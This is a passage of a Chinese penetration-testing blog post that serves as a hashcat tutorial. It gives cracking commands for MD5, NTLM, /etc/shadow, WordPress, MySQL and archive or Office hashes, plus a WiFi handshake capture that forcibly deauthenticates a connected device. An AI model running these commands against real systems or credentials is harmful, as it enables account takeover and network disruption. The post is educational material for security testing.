<span class="token number">6</span>-8位数字密码：--increment --increment-min <span class="token number">6</span> --increment-max <span class="token number">8</span> ?d?d?d?d?d?d?d?d
<span class="token number">6</span>-8位数字+小写字母密码：--increment --increment-min <span class="token number">6</span> --increment-max <span class="token number">8</span> ?h?h?h?h?h?h?h?h</code></pre>
<p>自定义掩码规则：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">--custom-charset1 <span class="token punctuation">[</span>chars<span class="token punctuation">]</span>等价于 -1
--custom-charset2 <span class="token punctuation">[</span>chars<span class="token punctuation">]</span>等价于 -2
--custom-charset3 <span class="token punctuation">[</span>chars<span class="token punctuation">]</span>等价于 -3
--custom-charset4 <span class="token punctuation">[</span>chars<span class="token punctuation">]</span>等价于 -4</code></pre>
<p>在掩码中用 ?1、?2、?3、?4 来表示</p>
<p>注意：</p>
<ul>
<li>—custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1</li>
<li>-3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456</li>
</ul>
<p>另外 Hash 模式与 ID 的对照表由于太长，这里就不放了，可以直接 hashcat -h 进行查看</p>
<h3 id="4、示例"><a href="#4、示例" class="headerlink" title="4、示例"></a>4、示例</h3><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>密码为 8 位数字</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> --force d54d1702ad0f8326224b817c796763c9 ?d?d?d?d?d?d?d?d</code></pre>
<p>密码为 4 位小写字母+数字</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> --force 4575621b0d88c303998e63fc74d165b0 -1 ?l?d ?1?1?1?1</code></pre>
<p>密码为 1-4 位大写字母+数字</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> --force 8fb5a3e7338ce951971d69be27fc5210 -1 ?u?d ?1?1?1?1 --increment --increment-min <span class="token number">1</span> --increment-max <span class="token number">4</span></code></pre>
<p>指定特定字符集：123456abcdf!@+- 进行破解</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -1 123456abcdf<span class="token operator">!</span>@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
由于在终端里可能会把部分字符识别为特殊字符，因此需要转义一下
hashcat -a <span class="token number">3</span> -1 123456abcdf<span class="token punctuation">\</span><span class="token operator">!</span><span class="token punctuation">\</span>@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1</code></pre>
<p>如果不知道目标密码的构成情况，可以直接使用 ?a 表示使用所有字符进行破解</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> 19b9a36f0cab6d89cd4d3c21b2aa15be --increment --increment-min <span class="token number">1</span> --increment-max <span class="token number">8</span> ?a?a?a?a?a?a?a?a</code></pre>
<p>使用字典破解</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">0</span> e10adc3949ba59abbe56e057f20f883e password.txt</code></pre>
<p>使用字典批量破解</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">0</span> hash.txt password.txt</code></pre>
<p>字典组合破解</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">1</span> 77b3e6926e7295494dd3be91c6934899 pwd1.txt pwd2.txt</code></pre>
<p>经过测试，这里的字典组合破解，不是说简单的将两个字典的内容合并去重形成 1 个字典进行去重，而是说字典 1 的内容加上字典 2 的内容组合成一个字典，例如：</p>
<p>pwd1.txt 字典为：</p>
<pre class="language-reStructuredText" data-language="reStructuredText"><code class="language-reStructuredText">admin
test
root</code></pre>
<p>pwd2.txt 字典为：</p>
<pre class="language-reStructuredText" data-language="reStructuredText"><code class="language-reStructuredText">@2021
123</code></pre>
<p>那么组合后的字典就是这样的：</p>
<pre class="language-reStructuredText" data-language="reStructuredText"><code class="language-reStructuredText">admin@2021
admin123
test@2021
test123
root@2021
root123</code></pre>
<p>字典+掩码破解，也是和上面一样的组合方法，只不过 pwd2.txt 换成了掩码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">6</span> e120ea280aa50693d5568d0071456460 pwd1.txt ?l?l?l</code></pre>
<h4 id="Mysql4-1-5"><a href="#Mysql4-1-5" class="headerlink" title="Mysql4.1/5"></a>Mysql4.1/5</h4><pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">300</span> --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d</code></pre>
<blockquote>
<p>可以使用 select authentication_string from mysql.user; 查看当前数据库中的密码哈希值</p>
</blockquote>
<h4 id="sha512crypt-6-SHA512-Unix"><a href="#sha512crypt-6-SHA512-Unix" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)"></a>sha512crypt $6$, SHA512 (Unix)</h4><p>sha512crypt $6$, SHA512 (Unix) 破解，为了避免系统误识别到特殊字符，这里为哈希值加了单引号</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">1800</span> --force <span class="token string">'$6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew/xd0O0hPG/yrm2X.'</span> ?l?l?l?l</code></pre>
<blockquote>
<p>可通过 cat /etc/shadow 获取哈希值</p>
</blockquote>
<p>或者不删除用户名，直接使用 —username 参数</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">1800</span> --force <span class="token string">'qiyou:$6$QDq75ki3$jsKm7qTDHz/xBob0kF1Lp170Cgg0i5Tslf3JW/sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1'</span> ?l?l?l?l?l --username</code></pre>
<h4 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h4><p>NT Hash</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">1000</span> 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l</code></pre>
<p>LM Hash</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">3000</span> F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l</code></pre>
<p>NetNTLM Hash</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">5500</span> teams.six::::822795daaf96s0a811fs6dd7b01dscssc601635cc1339basda6:e125cddcf51337asc7 -1 ?l?u ?1?1?1?1?d?d?d?d  --force</code></pre>
<h4 id="MSSQL-2005"><a href="#MSSQL-2005" class="headerlink" title="MSSQL (2005)"></a>MSSQL (2005)</h4><pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">132</span> --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d</code></pre>
<h4 id="WordPress-密码-hash"><a href="#WordPress-密码-hash" class="headerlink" title="WordPress 密码 hash"></a>WordPress 密码 hash</h4><pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">400</span> --force <span class="token string">'$P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY/'</span> ?d?d?d?d?d?d</code></pre>
<blockquote>
<p>具体加密脚本在 ./wp-includes/class-phpass.php 的 HashPassword 函数</p>
</blockquote>
<h4 id="Discuz-用户密码-hash"><a href="#Discuz-用户密码-hash" class="headerlink" title="Discuz 用户密码 hash"></a>Discuz 用户密码 hash</h4><pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">2611</span> --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d</code></pre>
<blockquote>
<p>其密码加密方式 md5(md5($pass).​$salt)</p>
</blockquote>
<h4 id="RAR-压缩密码"><a href="#RAR-压缩密码" class="headerlink" title="RAR 压缩密码"></a>RAR 压缩密码</h4><p>首先获取 rar 文件的 hash 值，我们可以使用另一款哈希破解工具 John 提供的 rar2john 工具将 rar 文件里的 hash 提取出来</p>
<p>rar2john 下载地址：<a target="_blank" rel="noopener" href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z">http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 获取 rar 文件 hash</span>
rar2john.exe <span class="token number">1</span>.rar</code></pre>
<p>hashcat 支持 RAR3-hp 和 RAR5</p>
<p>对于 RAR5，示例如下：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">13000</span> --force <span class="token string">'$rar5$16$b06f5f2d4c973d6235e1a88b8d5dd594$15$a520dddcc53dd4e3930b8489b013f273$8$733969e5bda903e4'</span> ?d?d?d?d?d?d</code></pre>
<p>对于 RAR3-hp</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">12500</span> --force <span class="token string">'$RAR3$*0*5ba3dd697a8706fa*919ad1d7a1c42bae4a8d462c8537c9cb'</span> ?d?d?d?d</code></pre>
<blockquote>
<p>RAR3-hp 哈希头为 $RAR3$*0*，而不是 $RAR3​$*1*，中间的数值是0（-hp）而不是1（-p），-p 尚未得到支持，只支持 -hp<br>关于 RAR 参数 -p 和 -hp 的区别： </p>
<p>-p：只对 RAR 文件加密，里面的目录和文件名没加密； </p>
<p>-hp：对目录中的文件名和子目录都进行加密处理</p>
</blockquote>
<h4 id="ZIP-压缩密码"><a href="#ZIP-压缩密码" class="headerlink" title="ZIP 压缩密码"></a>ZIP 压缩密码</h4><p>和 rar 破解过程一样，我们需要先提取 zip 文件的哈希值，这里可以使用 zip2john 进行获取，zip2john.exe 在上面下载的 rar2john.exe 的同级目录下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 获取 zip 文件 hash</span>
zip2john.exe <span class="token number">1</span>.zip
hashcat -a <span class="token number">3</span> -m <span class="token number">13600</span> <span class="token string">'$zip2$*0*3*0*18b1a7e7ad39cb3624e54622849b23c7*5b99*3*5deee7*a418cee1a98710adce9a*$/zip2$'</span> --force ?d?d?d?d?d?d</code></pre>
<blockquote>
<p>这里 ZIP 的加密算法使用的 AES256</p>
</blockquote>
<h4 id="office-密码"><a href="#office-密码" class="headerlink" title="office 密码"></a>office 密码</h4><p>和 rar 与 zip 破解过程一样，我们需要先提取 office 文件的哈希值，这里可以使用 office2john.py 进行获取，office2john.py 在上面下载的 rar2john.exe 和 zip2john.exe 的同级目录下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 获取 office 文件 hash</span>
python office2john.py <span class="token number">1</span>.docx</code></pre>
<blockquote>
<p>测试中发现 python 会出现告警信息，不过这个告警信息不会影响程序执行</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">9600</span> <span class="token string">'$office$*2013*100000*256*16*cd8856416b1e14305a0e8aa8eba6ce5c*18cada7070f1410f3a836c0dfc4b9643*befcde69afeafb3e652719533c824413b00ce4a499589e5ac5bd7a7a0d3c4f3d'</span> --force ?d?d?d?d?d?d</code></pre>
<blockquote>
<p>这里哈希头为 2013 所以使用 9600 破解模式，如果是 2010 则要使用 9500 破解模式，2007 则使用 9400 破解模式</p>
</blockquote>
<h4 id="WIFI-密码"><a href="#WIFI-密码" class="headerlink" title="WIFI 密码"></a>WIFI 密码</h4><p>要破解 WIFI 密码，首先要抓到 WIFI 的握手包，要想得到 WIFI 的握手包，就需要在监听时刚好有设备连接了该 WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI 的设备踢下去，一般设备就会自动连接该 WIFI，此时我们就抓到握手包了</p>
<p>1、将网卡处于监听状态</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">airmon-ng check 
airmon-ng check <span class="token function">kill</span> // 关闭影响监听状态的进程
airmon-ng start wlan0</code></pre>
<blockquote>
<p>wlan0 是网卡名称，一般都是 wlan0，如果不是则需要根据自己的情况进行修改，可通过 iwconfig 进行查看网卡的名称</p>
</blockquote>
<p>当使用 iwconfig 查看网卡名称变为 wlan0mon 说明此时网卡已经处于监听模式了</p>
<p>2、扫描可用 WIFI</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">airodump-ng wlan0mon</code></pre>
<p>3、获取wifi的握手包</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">airodump-ng -c <span class="token punctuation">(</span>上一步扫描的 CH <span class="token punctuation">)</span> --bssid <span class="token punctuation">(</span>想要破解 WIFI 的 bssid <span class="token punctuation">)</span> -w <span class="token punctuation">(</span>握手文件存放目录<span class="token punctuation">)</span> wlan0mon</code></pre>
<p>这里以 ssid 为 teamssix 的 WIFI 为例</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">airodump-ng -c <span class="token number">1</span> --bssid 5E:C1:1B:A2:37:F1 -w ./ wlan0mon</code></pre>
<p>为了顺利得到 WIFI 的握手包，可以将该 WIFI 下的设备强制踢下去</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aireplay-ng -0 <span class="token number">0</span> -a <span class="token punctuation">(</span>要破解的 wifi 的 bssid <span class="token punctuation">)</span> -c <span class="token punctuation">(</span>强制踢下的设备的 MAC 地址<span class="token punctuation">)</span> wlan0mon

teamssix 这个 WIFI 有一个设备正在连接，该设备的 MAC 地址为：38:26:2C:13:D3:33，使用以下命令可以将其强制踢下去

aireplay-ng -0 <span class="token number">0</span> -a 5E:C1:1B:A2:37:F1 -c <span class="token number">38</span>:26:2C:13:D3:33 wlan0mon</code></pre>
<p>等待设备重新连接后，当右上角出现 WPA handshake 的时候说明获取成功</p>
<p>4、破解密码</p>
<p>使用 aircrack-ng 将握手包转换成 hccapx 格式</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aircrack-ng <span class="token number">1</span>.cap -j <span class="token number">1</span>
hashcat -a <span class="token number">3</span> -m <span class="token number">2500</span> <span class="token number">1</span>.hccapx ?d?d?d?d?d?d?d?d --force</code></pre>
<p>或者使用 hashcat 官网提供的在线工具进行格式转换：<a target="_blank" rel="noopener" href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -a <span class="token number">3</span> -m <span class="token number">22000</span> <span class="token number">1</span>.hc22000 ?d?d?d?d?d?d?d?d --force</code></pre>
<h3 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h3><ul>
<li>Hashcat 在有时破解的时候会提示 All hashes found in potfile!，这表明该 hash 已经被破解出来过了，可以使用 hashcat [哈希值] —show 查看已破解出来的明文密码</li>
<li>如果想再次破解已经破解过的密码，删除 ~/.hashcat/hashcat.potfile 文件里的对应记录即可</li>
<li>在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化</li>
<li>在实际破解过程中，可以先使用 top 字典进行破解，不行再试试社工字典，比如姓名+生日的组合字典</li>
<li>Hashcat 参数优化：</li>
</ul>
<pre class="language-bash" data-language="bash"><code class="language-bash">--gpu-accel <span class="token number">160</span>         可以让GPU发挥最大性能
--gpu-loops <span class="token number">1024</span>        可以让GPU发挥最大性能
--segment-size <span class="token number">512</span>      可以提高大字典破解的速度</code></pre>
<p><a target="_blank" rel="noopener" href="https://bipy.me/post/crack-rar/">https://bipy.me/post/crack-rar/</a></p>
<p><a target="_blank" rel="noopener" href="https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/">https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2019/10/hashcat.html">https://www.sqlsec.com/2019/10/hashcat.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44064908/article/details/103920329">https://blog.csdn.net/weixin_44064908/article/details/103920329</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">ezy</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://ezy0812.github.io/2022/10/26/%E5%86%85%E7%BD%91%E7%AC%94%E8%AE%B00x03/">https://ezy0812.github.io/2022/10/26/%E5%86%85%E7%BD%91%E7%AC%94%E8%AE%B00x03/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">ezy</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E5%86%85%E7%BD%91/">
                                    <span class="chip bg-color">内网</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2022/10/26/%E5%86%85%E7%BD%91%E7%AC%94%E8%AE%B00x04/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="内网笔记0x04">
                        
                        <span class="card-title">内网笔记0x04</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-26
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
                                    渗透测试
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%86%85%E7%BD%91/">
                        <span class="chip bg-color">内网</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/10/26/%E5%86%85%E7%BD%91%E7%AC%94%E8%AE%B00x02/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="内网笔记0x02">
                        
                        <span class="card-title">内网笔记0x02</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-26
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
                                    渗透测试
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%86%85%E7%BD%91/">
                        <span class="chip bg-color">内网</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2022</span>
            
            <a href="/about" target="_blank">ezy</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/ezy0812" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>















    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
